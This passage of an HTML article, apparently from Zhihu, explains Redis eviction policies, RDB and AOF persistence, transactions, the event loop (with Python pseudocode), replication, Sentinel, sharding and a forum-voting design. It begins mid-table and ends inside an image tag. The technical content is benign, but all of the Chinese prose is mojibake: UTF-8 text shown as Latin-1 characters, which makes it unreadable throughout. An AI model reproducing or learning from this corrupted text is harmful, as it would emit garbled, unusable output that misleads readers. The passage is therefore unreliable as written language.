ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±° | | volatile-ttl | ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­æŒ‘é€‰å°†è¦è¿‡æœŸçš„æ•°æ®æ·˜æ±° | |volatile-random | ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­ä»»æ„é€‰æ‹©æ•°æ®æ·˜æ±° | | allkeys-lru | ä»æ‰€æœ‰æ•°æ®é›†ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±° | | allkeys-random | ä»æ‰€æœ‰æ•°æ®é›†ä¸­ä»»æ„é€‰æ‹©æ•°æ®è¿›è¡Œæ·˜æ±° | | noeviction | ç¦æ­¢é©±é€æ•°æ® |</p><p>ä½œä¸ºå†…å­˜æ•°æ®åº“ï¼Œå‡ºäºå¯¹æ€§èƒ½å’Œå†…å­˜æ¶ˆè€—çš„è€ƒè™‘ï¼ŒRedis çš„æ·˜æ±°ç®—æ³•å®é™…å®ç°ä¸Šå¹¶éé’ˆå¯¹æ‰€æœ‰ keyï¼Œè€Œæ˜¯æŠ½æ ·ä¸€å°éƒ¨åˆ†å¹¶ä¸”ä»ä¸­é€‰å‡ºè¢«æ·˜æ±°çš„ keyã€‚</p><p>ä½¿ç”¨ Redis ç¼“å­˜æ•°æ®æ—¶ï¼Œä¸ºäº†æé«˜ç¼“å­˜å‘½ä¸­ç‡ï¼Œéœ€è¦ä¿è¯ç¼“å­˜æ•°æ®éƒ½æ˜¯çƒ­ç‚¹æ•°æ®ã€‚å¯ä»¥å°†å†…å­˜æœ€å¤§ä½¿ç”¨é‡è®¾ç½®ä¸ºçƒ­ç‚¹æ•°æ®å ç”¨çš„å†…å­˜é‡ï¼Œç„¶åå¯ç”¨ allkeys-lru æ·˜æ±°ç­–ç•¥ï¼Œå°†æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°ã€‚</p><p>Redis 4.0 å¼•å…¥äº† volatile-lfu å’Œ allkeys-lfu æ·˜æ±°ç­–ç•¥ï¼ŒLFU ç­–ç•¥é€šè¿‡ç»Ÿè®¡è®¿é—®é¢‘ç‡ï¼Œå°†è®¿é—®é¢‘ç‡æœ€å°‘çš„é”®å€¼å¯¹æ·˜æ±°ã€‚</p><h2>å…«ã€æŒä¹…åŒ–</h2><p>Redis æ˜¯å†…å­˜å‹æ•°æ®åº“ï¼Œä¸ºäº†ä¿è¯æ•°æ®åœ¨æ–­ç”µåä¸ä¼šä¸¢å¤±ï¼Œéœ€è¦å°†å†…å­˜ä¸­çš„æ•°æ®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸Šã€‚</p><h2>RDB æŒä¹…åŒ–</h2><p>å°†æŸä¸ªæ—¶é—´ç‚¹çš„æ‰€æœ‰æ•°æ®éƒ½å­˜æ”¾åˆ°ç¡¬ç›˜ä¸Šã€‚</p><p>å¯ä»¥å°†å¿«ç…§å¤åˆ¶åˆ°å…¶å®ƒæœåŠ¡å™¨ä»è€Œåˆ›å»ºå…·æœ‰ç›¸åŒæ•°æ®çš„æœåŠ¡å™¨å‰¯æœ¬ã€‚</p><p>å¦‚æœç³»ç»Ÿå‘ç”Ÿæ•…éšœï¼Œå°†ä¼šä¸¢å¤±æœ€åä¸€æ¬¡åˆ›å»ºå¿«ç…§ä¹‹åçš„æ•°æ®ã€‚</p><p>å¦‚æœæ•°æ®é‡å¾ˆå¤§ï¼Œä¿å­˜å¿«ç…§çš„æ—¶é—´ä¼šå¾ˆé•¿ã€‚</p><h2>AOF æŒä¹…åŒ–</h2><p>å°†å†™å‘½ä»¤æ·»åŠ åˆ° AOF æ–‡ä»¶ï¼ˆAppend Only Fileï¼‰çš„æœ«å°¾ã€‚</p><p>ä½¿ç”¨ AOF æŒä¹…åŒ–éœ€è¦è®¾ç½®åŒæ­¥é€‰é¡¹ï¼Œä»è€Œç¡®ä¿å†™å‘½ä»¤åŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ä¸Šçš„æ—¶æœºã€‚è¿™æ˜¯å› ä¸ºå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥å¹¶ä¸ä¼šé©¬ä¸Šå°†å†…å®¹åŒæ­¥åˆ°ç£ç›˜ä¸Šï¼Œè€Œæ˜¯å…ˆå­˜å‚¨åˆ°ç¼“å†²åŒºï¼Œç„¶åç”±æ“ä½œç³»ç»Ÿå†³å®šä»€ä¹ˆæ—¶å€™åŒæ­¥åˆ°ç£ç›˜ã€‚æœ‰ä»¥ä¸‹åŒæ­¥é€‰é¡¹ï¼š</p><p>| é€‰é¡¹ | åŒæ­¥é¢‘ç‡ | | :--: | :--: | | always | æ¯ä¸ªå†™å‘½ä»¤éƒ½åŒæ­¥ | | everysec | æ¯ç§’åŒæ­¥ä¸€æ¬¡ | | no | è®©æ“ä½œç³»ç»Ÿæ¥å†³å®šä½•æ—¶åŒæ­¥ |</p><ul><li>always é€‰é¡¹ä¼šä¸¥é‡å‡ä½æœåŠ¡å™¨çš„æ€§èƒ½ï¼›</li><li>everysec é€‰é¡¹æ¯”è¾ƒåˆé€‚ï¼Œå¯ä»¥ä¿è¯ç³»ç»Ÿå´©æºƒæ—¶åªä¼šä¸¢å¤±ä¸€ç§’å·¦å³çš„æ•°æ®ï¼Œå¹¶ä¸” Redis æ¯ç§’æ‰§è¡Œä¸€æ¬¡åŒæ­¥å¯¹æœåŠ¡å™¨æ€§èƒ½å‡ ä¹æ²¡æœ‰ä»»ä½•å½±å“ï¼›</li><li>no é€‰é¡¹å¹¶ä¸èƒ½ç»™æœåŠ¡å™¨æ€§èƒ½å¸¦æ¥å¤šå¤§çš„æå‡ï¼Œè€Œä¸”ä¹Ÿä¼šå¢åŠ ç³»ç»Ÿå´©æºƒæ—¶æ•°æ®ä¸¢å¤±çš„æ•°é‡ã€‚</li></ul><p>éšç€æœåŠ¡å™¨å†™è¯·æ±‚çš„å¢å¤šï¼ŒAOF æ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§ã€‚Redis æä¾›äº†ä¸€ç§å°† AOF é‡å†™çš„ç‰¹æ€§ï¼Œèƒ½å¤Ÿå»é™¤ AOF æ–‡ä»¶ä¸­çš„å†—ä½™å†™å‘½ä»¤ã€‚</p><h2>ä¹ã€äº‹åŠ¡</h2><p>ä¸€ä¸ªäº‹åŠ¡åŒ…å«äº†å¤šä¸ªå‘½ä»¤ï¼ŒæœåŠ¡å™¨åœ¨æ‰§è¡Œäº‹åŠ¡æœŸé—´ï¼Œä¸ä¼šæ”¹å»æ‰§è¡Œå…¶å®ƒå®¢æˆ·ç«¯çš„å‘½ä»¤è¯·æ±‚ã€‚</p><p>äº‹åŠ¡ä¸­çš„å¤šä¸ªå‘½ä»¤è¢«ä¸€æ¬¡æ€§å‘é€ç»™æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯ä¸€æ¡ä¸€æ¡å‘é€ï¼Œè¿™ç§æ–¹å¼è¢«ç§°ä¸ºæµæ°´çº¿ï¼Œå®ƒå¯ä»¥å‡å°‘å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„ç½‘ç»œé€šä¿¡æ¬¡æ•°ä»è€Œæå‡æ€§èƒ½ã€‚</p><p>Redis æœ€ç®€å•çš„äº‹åŠ¡å®ç°æ–¹å¼æ˜¯ä½¿ç”¨ MULTI å’Œ EXEC å‘½ä»¤å°†äº‹åŠ¡æ“ä½œåŒ…å›´èµ·æ¥ã€‚</p><h2>åã€äº‹ä»¶</h2><p>Redis æœåŠ¡å™¨æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ç¨‹åºã€‚</p><h2>æ–‡ä»¶äº‹ä»¶</h2><p>æœåŠ¡å™¨é€šè¿‡å¥—æ¥å­—ä¸å®¢æˆ·ç«¯æˆ–è€…å…¶å®ƒæœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œæ–‡ä»¶äº‹ä»¶å°±æ˜¯å¯¹å¥—æ¥å­—æ“ä½œçš„æŠ½è±¡ã€‚</p><p>Redis åŸºäº Reactor æ¨¡å¼å¼€å‘äº†è‡ªå·±çš„ç½‘ç»œäº‹ä»¶å¤„ç†å™¨ï¼Œä½¿ç”¨ I/O å¤šè·¯å¤ç”¨ç¨‹åºæ¥åŒæ—¶ç›‘å¬å¤šä¸ªå¥—æ¥å­—ï¼Œå¹¶å°†åˆ°è¾¾çš„äº‹ä»¶ä¼ é€ç»™æ–‡ä»¶äº‹ä»¶åˆ†æ´¾å™¨ï¼Œåˆ†æ´¾å™¨ä¼šæ ¹æ®å¥—æ¥å­—äº§ç”Ÿçš„äº‹ä»¶ç±»å‹è°ƒç”¨ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-72d61b5d9362b644f8778aab0edcd523_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"548\" data-rawheight=\"319\" class=\"origin_image zh-lightbox-thumb\" width=\"548\" data-original=\"https://pic4.zhimg.com/v2-72d61b5d9362b644f8778aab0edcd523_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;548&#39; height=&#39;319&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"548\" data-rawheight=\"319\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"548\" data-original=\"https://pic4.zhimg.com/v2-72d61b5d9362b644f8778aab0edcd523_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-72d61b5d9362b644f8778aab0edcd523_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>æ—¶é—´äº‹ä»¶</h2><p>æœåŠ¡å™¨æœ‰ä¸€äº›æ“ä½œéœ€è¦åœ¨ç»™å®šçš„æ—¶é—´ç‚¹æ‰§è¡Œï¼Œæ—¶é—´äº‹ä»¶æ˜¯å¯¹è¿™ç±»å®šæ—¶æ“ä½œçš„æŠ½è±¡ã€‚</p><p>æ—¶é—´äº‹ä»¶åˆåˆ†ä¸ºï¼š</p><ul><li>å®šæ—¶äº‹ä»¶ï¼šæ˜¯è®©ä¸€æ®µç¨‹åºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹å†…æ‰§è¡Œä¸€æ¬¡ï¼›</li><li>å‘¨æœŸæ€§äº‹ä»¶ï¼šæ˜¯è®©ä¸€æ®µç¨‹åºæ¯éš”æŒ‡å®šæ—¶é—´å°±æ‰§è¡Œä¸€æ¬¡ã€‚</li></ul><p>Redis å°†æ‰€æœ‰æ—¶é—´äº‹ä»¶éƒ½æ”¾åœ¨ä¸€ä¸ªæ— åºé“¾è¡¨ä¸­ï¼Œé€šè¿‡éå†æ•´ä¸ªé“¾è¡¨æŸ¥æ‰¾å‡ºå·²åˆ°è¾¾çš„æ—¶é—´äº‹ä»¶ï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚</p><h2>äº‹ä»¶çš„è°ƒåº¦ä¸æ‰§è¡Œ</h2><p>æœåŠ¡å™¨éœ€è¦ä¸æ–­ç›‘å¬æ–‡ä»¶äº‹ä»¶çš„å¥—æ¥å­—æ‰èƒ½å¾—åˆ°å¾…å¤„ç†çš„æ–‡ä»¶äº‹ä»¶ï¼Œä½†æ˜¯ä¸èƒ½ä¸€ç›´ç›‘å¬ï¼Œå¦åˆ™æ—¶é—´äº‹ä»¶æ— æ³•åœ¨è§„å®šçš„æ—¶é—´å†…æ‰§è¡Œï¼Œå› æ­¤ç›‘å¬æ—¶é—´åº”è¯¥æ ¹æ®è·ç¦»ç°åœ¨æœ€è¿‘çš„æ—¶é—´äº‹ä»¶æ¥å†³å®šã€‚</p><p>äº‹ä»¶è°ƒåº¦ä¸æ‰§è¡Œç”± aeProcessEvents å‡½æ•°è´Ÿè´£ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">aeProcessEvents</span><span class=\"p\">():</span>\n    <span class=\"c1\"># è·å–åˆ°è¾¾æ—¶é—´ç¦»å½“å‰æ—¶é—´æœ€æ¥è¿‘çš„æ—¶é—´äº‹ä»¶</span>\n    <span class=\"n\">time_event</span> <span class=\"o\">=</span> <span class=\"n\">aeSearchNearestTimer</span><span class=\"p\">()</span>\n    <span class=\"c1\"># è®¡ç®—æœ€æ¥è¿‘çš„æ—¶é—´äº‹ä»¶è·ç¦»åˆ°è¾¾è¿˜æœ‰å¤šå°‘æ¯«ç§’</span>\n    <span class=\"n\">remaind_ms</span> <span class=\"o\">=</span> <span class=\"n\">time_event</span><span class=\"o\">.</span><span class=\"n\">when</span> <span class=\"o\">-</span> <span class=\"n\">unix_ts_now</span><span class=\"p\">()</span>\n    <span class=\"c1\"># å¦‚æœäº‹ä»¶å·²åˆ°è¾¾ï¼Œé‚£ä¹ˆ remaind_ms çš„å€¼å¯èƒ½ä¸ºè´Ÿæ•°ï¼Œå°†å®ƒè®¾ä¸º 0</span>\n    <span class=\"k\">if</span> <span class=\"n\">remaind_ms</span> <span class=\"o\">&lt;</span> <span class=\"mi\">0</span><span class=\"p\">:</span>\n        <span class=\"n\">remaind_ms</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n    <span class=\"c1\"># æ ¹æ® remaind_ms çš„å€¼ï¼Œåˆ›å»º timeval</span>\n    <span class=\"n\">timeval</span> <span class=\"o\">=</span> <span class=\"n\">create_timeval_with_ms</span><span class=\"p\">(</span><span class=\"n\">remaind_ms</span><span class=\"p\">)</span>\n    <span class=\"c1\"># é˜»å¡å¹¶ç­‰å¾…æ–‡ä»¶äº‹ä»¶äº§ç”Ÿï¼Œæœ€å¤§é˜»å¡æ—¶é—´ç”±ä¼ å…¥çš„ timeval å†³å®š</span>\n    <span class=\"n\">aeApiPoll</span><span class=\"p\">(</span><span class=\"n\">timeval</span><span class=\"p\">)</span>\n    <span class=\"c1\"># å¤„ç†æ‰€æœ‰å·²äº§ç”Ÿçš„æ–‡ä»¶äº‹ä»¶</span>\n    <span class=\"n\">procesFileEvents</span><span class=\"p\">()</span>\n    <span class=\"c1\"># å¤„ç†æ‰€æœ‰å·²åˆ°è¾¾çš„æ—¶é—´äº‹ä»¶</span>\n    <span class=\"n\">processTimeEvents</span><span class=\"p\">()</span></code></pre></div><p>å°† aeProcessEvents å‡½æ•°ç½®äºä¸€ä¸ªå¾ªç¯é‡Œé¢ï¼ŒåŠ ä¸Šåˆå§‹åŒ–å’Œæ¸…ç†å‡½æ•°ï¼Œå°±æ„æˆäº† Redis æœåŠ¡å™¨çš„ä¸»å‡½æ•°ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>\n    <span class=\"c1\"># åˆå§‹åŒ–æœåŠ¡å™¨</span>\n    <span class=\"n\">init_server</span><span class=\"p\">()</span>\n    <span class=\"c1\"># ä¸€ç›´å¤„ç†äº‹ä»¶ï¼Œç›´åˆ°æœåŠ¡å™¨å…³é—­ä¸ºæ­¢</span>\n    <span class=\"k\">while</span> <span class=\"n\">server_is_not_shutdown</span><span class=\"p\">():</span>\n        <span class=\"n\">aeProcessEvents</span><span class=\"p\">()</span>\n    <span class=\"c1\"># æœåŠ¡å™¨å…³é—­ï¼Œæ‰§è¡Œæ¸…ç†æ“ä½œ</span>\n    <span class=\"n\">clean_server</span><span class=\"p\">()</span></code></pre></div><p>ä»äº‹ä»¶å¤„ç†çš„è§’åº¦æ¥çœ‹ï¼ŒæœåŠ¡å™¨è¿è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-1326faa27a0e21aaee5e303c67689396_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"556\" data-rawheight=\"630\" class=\"origin_image zh-lightbox-thumb\" width=\"556\" data-original=\"https://pic3.zhimg.com/v2-1326faa27a0e21aaee5e303c67689396_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;556&#39; height=&#39;630&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"556\" data-rawheight=\"630\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"556\" data-original=\"https://pic3.zhimg.com/v2-1326faa27a0e21aaee5e303c67689396_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-1326faa27a0e21aaee5e303c67689396_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>åä¸€ã€å¤åˆ¶</h2><p>é€šè¿‡ä½¿ç”¨ slaveof host port å‘½ä»¤æ¥è®©ä¸€ä¸ªæœåŠ¡å™¨æˆä¸ºå¦ä¸€ä¸ªæœåŠ¡å™¨çš„ä»æœåŠ¡å™¨ã€‚</p><p>ä¸€ä¸ªä»æœåŠ¡å™¨åªèƒ½æœ‰ä¸€ä¸ªä¸»æœåŠ¡å™¨ï¼Œå¹¶ä¸”ä¸æ”¯æŒä¸»ä¸»å¤åˆ¶ã€‚</p><h2>è¿æ¥è¿‡ç¨‹</h2><ol><li> ä¸»æœåŠ¡å™¨åˆ›å»ºå¿«ç…§æ–‡ä»¶ï¼Œå‘é€ç»™ä»æœåŠ¡å™¨ï¼Œå¹¶åœ¨å‘é€æœŸé—´ä½¿ç”¨ç¼“å†²åŒºè®°å½•æ‰§è¡Œçš„å†™å‘½ä»¤ã€‚å¿«ç…§æ–‡ä»¶å‘é€å®Œæ¯•ä¹‹åï¼Œå¼€å§‹å‘ä»æœåŠ¡å™¨å‘é€å­˜å‚¨åœ¨ç¼“å†²åŒºä¸­çš„å†™å‘½ä»¤ï¼›<br/> </li><li> ä»æœåŠ¡å™¨ä¸¢å¼ƒæ‰€æœ‰æ—§æ•°æ®ï¼Œè½½å…¥ä¸»æœåŠ¡å™¨å‘æ¥çš„å¿«ç…§æ–‡ä»¶ï¼Œä¹‹åä»æœåŠ¡å™¨å¼€å§‹æ¥å—ä¸»æœåŠ¡å™¨å‘æ¥çš„å†™å‘½ä»¤ï¼›<br/> </li><li> ä¸»æœåŠ¡å™¨æ¯æ‰§è¡Œä¸€æ¬¡å†™å‘½ä»¤ï¼Œå°±å‘ä»æœåŠ¡å™¨å‘é€ç›¸åŒçš„å†™å‘½ä»¤ã€‚<br/> </li></ol><h2>ä¸»ä»é“¾</h2><p>éšç€è´Ÿè½½ä¸æ–­ä¸Šå‡ï¼Œä¸»æœåŠ¡å™¨å¯èƒ½æ— æ³•å¾ˆå¿«åœ°æ›´æ–°æ‰€æœ‰ä»æœåŠ¡å™¨ï¼Œæˆ–è€…é‡æ–°è¿æ¥å’Œé‡æ–°åŒæ­¥ä»æœåŠ¡å™¨å°†å¯¼è‡´ç³»ç»Ÿè¶…è½½ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªä¸­é—´å±‚æ¥åˆ†æ‹…ä¸»æœåŠ¡å™¨çš„å¤åˆ¶å·¥ä½œã€‚ä¸­é—´å±‚çš„æœåŠ¡å™¨æ˜¯æœ€ä¸Šå±‚æœåŠ¡å™¨çš„ä»æœåŠ¡å™¨ï¼Œåˆæ˜¯æœ€ä¸‹å±‚æœåŠ¡å™¨çš„ä¸»æœåŠ¡å™¨ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4c18bbb90a0371ffce544d91ff8da011_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"394\" class=\"origin_image zh-lightbox-thumb\" width=\"760\" data-original=\"https://pic2.zhimg.com/v2-4c18bbb90a0371ffce544d91ff8da011_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;760&#39; height=&#39;394&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"394\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"760\" data-original=\"https://pic2.zhimg.com/v2-4c18bbb90a0371ffce544d91ff8da011_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4c18bbb90a0371ffce544d91ff8da011_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>åäºŒã€Sentinel</h2><p>Sentinelï¼ˆå“¨å…µï¼‰å¯ä»¥ç›‘å¬é›†ç¾¤ä¸­çš„æœåŠ¡å™¨ï¼Œå¹¶åœ¨ä¸»æœåŠ¡å™¨è¿›å…¥ä¸‹çº¿çŠ¶æ€æ—¶ï¼Œè‡ªåŠ¨ä»ä»æœåŠ¡å™¨ä¸­é€‰ä¸¾å‡ºæ–°çš„ä¸»æœåŠ¡å™¨ã€‚</p><h2>åä¸‰ã€åˆ†ç‰‡</h2><p>åˆ†ç‰‡æ˜¯å°†æ•°æ®åˆ’åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†çš„æ–¹æ³•ï¼Œå¯ä»¥å°†æ•°æ®å­˜å‚¨åˆ°å¤šå°æœºå™¨é‡Œé¢ï¼Œè¿™ç§æ–¹æ³•åœ¨è§£å†³æŸäº›é—®é¢˜æ—¶å¯ä»¥è·å¾—çº¿æ€§çº§åˆ«çš„æ€§èƒ½æå‡ã€‚</p><p>å‡è®¾æœ‰ 4 ä¸ª Redis å®ä¾‹ R0ï¼ŒR1ï¼ŒR2ï¼ŒR3ï¼Œè¿˜æœ‰å¾ˆå¤šè¡¨ç¤ºç”¨æˆ·çš„é”® user:1ï¼Œuser:2ï¼Œ... ï¼Œæœ‰ä¸åŒçš„æ–¹å¼æ¥é€‰æ‹©ä¸€ä¸ªæŒ‡å®šçš„é”®å­˜å‚¨åœ¨å“ªä¸ªå®ä¾‹ä¸­ã€‚</p><ul><li>æœ€ç®€å•çš„æ–¹å¼æ˜¯èŒƒå›´åˆ†ç‰‡ï¼Œä¾‹å¦‚ç”¨æˆ· id ä» 0\\~1000 çš„å­˜å‚¨åˆ°å®ä¾‹ R0 ä¸­ï¼Œç”¨æˆ· id ä» 1001\\~2000 çš„å­˜å‚¨åˆ°å®ä¾‹ R1 ä¸­ï¼Œç­‰ç­‰ã€‚ä½†æ˜¯è¿™æ ·éœ€è¦ç»´æŠ¤ä¸€å¼ æ˜ å°„èŒƒå›´è¡¨ï¼Œç»´æŠ¤æ“ä½œä»£ä»·å¾ˆé«˜ã€‚</li><li>è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯å“ˆå¸Œåˆ†ç‰‡ï¼Œä½¿ç”¨ CRC32 å“ˆå¸Œå‡½æ•°å°†é”®è½¬æ¢ä¸ºä¸€ä¸ªæ•°å­—ï¼Œå†å¯¹å®ä¾‹æ•°é‡æ±‚æ¨¡å°±èƒ½çŸ¥é“åº”è¯¥å­˜å‚¨çš„å®ä¾‹ã€‚</li></ul><p>æ ¹æ®æ‰§è¡Œåˆ†ç‰‡çš„ä½ç½®ï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç§åˆ†ç‰‡æ–¹å¼ï¼š</p><ul><li>å®¢æˆ·ç«¯åˆ†ç‰‡ï¼šå®¢æˆ·ç«¯ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç­‰ç®—æ³•å†³å®šé”®åº”å½“åˆ†å¸ƒåˆ°å“ªä¸ªèŠ‚ç‚¹ã€‚</li><li>ä»£ç†åˆ†ç‰‡ï¼šå°†å®¢æˆ·ç«¯è¯·æ±‚å‘é€åˆ°ä»£ç†ä¸Šï¼Œç”±ä»£ç†è½¬å‘è¯·æ±‚åˆ°æ­£ç¡®çš„èŠ‚ç‚¹ä¸Šã€‚</li><li>æœåŠ¡å™¨åˆ†ç‰‡ï¼šRedis Clusterã€‚</li></ul><h2>åå››ã€ä¸€ä¸ªç®€å•çš„è®ºå›ç³»ç»Ÿåˆ†æ</h2><p>è¯¥è®ºå›ç³»ç»ŸåŠŸèƒ½å¦‚ä¸‹ï¼š</p><ul><li>å¯ä»¥å‘å¸ƒæ–‡ç« ï¼›</li><li>å¯ä»¥å¯¹æ–‡ç« è¿›è¡Œç‚¹èµï¼›</li><li>åœ¨é¦–é¡µå¯ä»¥æŒ‰æ–‡ç« çš„å‘å¸ƒæ—¶é—´æˆ–è€…æ–‡ç« çš„ç‚¹èµæ•°è¿›è¡Œæ’åºæ˜¾ç¤ºã€‚</li></ul><h2>æ–‡ç« ä¿¡æ¯</h2><p>æ–‡ç« åŒ…æ‹¬æ ‡é¢˜ã€ä½œè€…ã€èµæ•°ç­‰ä¿¡æ¯ï¼Œåœ¨å…³ç³»å‹æ•°æ®åº“ä¸­å¾ˆå®¹æ˜“æ„å»ºä¸€å¼ è¡¨æ¥å­˜å‚¨è¿™äº›ä¿¡æ¯ï¼Œåœ¨ Redis ä¸­å¯ä»¥ä½¿ç”¨ HASH æ¥å­˜å‚¨æ¯ç§ä¿¡æ¯ä»¥åŠå…¶å¯¹åº”çš„å€¼çš„æ˜ å°„ã€‚</p><p>Redis æ²¡æœ‰å…³ç³»å‹æ•°æ®åº“ä¸­çš„è¡¨è¿™ä¸€æ¦‚å¿µæ¥å°†åŒç§ç±»å‹çš„æ•°æ®å­˜æ”¾åœ¨ä¸€èµ·ï¼Œè€Œæ˜¯ä½¿ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥å®ç°è¿™ä¸€åŠŸèƒ½ã€‚é”®åçš„å‰é¢éƒ¨åˆ†å­˜å‚¨å‘½åç©ºé—´ï¼Œåé¢éƒ¨åˆ†çš„å†…å®¹å­˜å‚¨ IDï¼Œé€šå¸¸ä½¿ç”¨ : æ¥è¿›è¡Œåˆ†éš”ã€‚ä¾‹å¦‚ä¸‹é¢çš„ HASH çš„é”®åä¸º article:92617ï¼Œå…¶ä¸­ article ä¸ºå‘½åç©ºé—´ï¼ŒID ä¸º 92617ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-44f945faa4ac08fe38a6aad55d1fdb47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"766\" data-rawheight=\"590\" class=\"origin_image zh-lightbox-thumb\" width=\"766\" data-original=\"https://pic4.zhimg.com/v2-44f945faa4ac08fe38a6aad55d1fdb47_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;766&#39; height=&#39;590&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"766\" data-rawheight=\"590\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"766\" data-original=\"https://pic4.zhimg.com/v2-44f945faa4ac08fe38a6aad55d1fdb47_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-44f945faa4ac08fe38a6aad55d1fdb47_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ç‚¹èµåŠŸèƒ½</h2><p>å½“æœ‰ç”¨æˆ·ä¸ºä¸€ç¯‡æ–‡ç« ç‚¹èµæ—¶ï¼Œé™¤äº†è¦å¯¹è¯¥æ–‡ç« çš„ votes å­—æ®µè¿›è¡ŒåŠ  1 æ“ä½œï¼Œè¿˜å¿…é¡»è®°å½•è¯¥ç”¨æˆ·å·²ç»å¯¹è¯¥æ–‡ç« è¿›è¡Œäº†ç‚¹èµï¼Œé˜²æ­¢ç”¨æˆ·ç‚¹èµæ¬¡æ•°è¶…è¿‡ 1ã€‚å¯ä»¥å»ºç«‹æ–‡ç« çš„å·²æŠ•ç¥¨ç”¨æˆ·é›†åˆæ¥è¿›è¡Œè®°å½•ã€‚</p><p>ä¸ºäº†èŠ‚çº¦å†…å­˜ï¼Œè§„å®šä¸€ç¯‡æ–‡ç« å‘å¸ƒæ»¡ä¸€å‘¨ä¹‹åï¼Œå°±ä¸èƒ½å†å¯¹å®ƒè¿›è¡ŒæŠ•ç¥¨ï¼Œè€Œæ–‡ç« çš„å·²æŠ•ç¥¨é›†åˆä¹Ÿä¼šè¢«åˆ é™¤ï¼Œå¯ä»¥ä¸ºæ–‡ç« çš„å·²æŠ•ç¥¨é›†åˆè®¾ç½®ä¸€ä¸ªä¸€å‘¨çš„è¿‡æœŸæ—¶é—´å°±èƒ½å®ç°è¿™ä¸ªè§„å®šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-b02800d838d4e9d49f383b20d580bb73_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"781\" data-rawheight=\"521\" class=\"origin_image zh-lightbox-thumb\" width=\"781\" data-original=\"https://pic4.zhimg.com/v2-b02800d838d4e9d49f383b20d580bb73_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;781&#39; height=&#39;521&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"781\" data-rawheight=\"521\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"781\" data-original=\"https://pic4.zhimg.com/v2-b02800d838d4e9d49f383b20d580bb73_r.jpg\" 